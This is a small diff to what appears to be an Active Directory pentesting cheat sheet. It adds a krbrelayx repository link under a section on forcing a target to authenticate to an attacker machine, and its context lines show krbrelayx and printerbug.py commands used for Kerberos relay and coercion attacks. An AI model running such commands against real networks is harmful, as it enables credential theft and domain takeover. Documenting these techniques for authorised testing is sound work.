@@ -882,6 +882,7 @@ sudo python3 /opt/windows/krbrelayx/krbrelayx.py -hashes :<HASH>
 #### Trigger target to authenticate to attacker machine
 - Use hostname we created in the DNS record
 - https://github.com/topotam/PetitPotam
+- https://github.com/dirkjanm/krbrelayx
 ```
 python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME>.<DOMAIN>
 
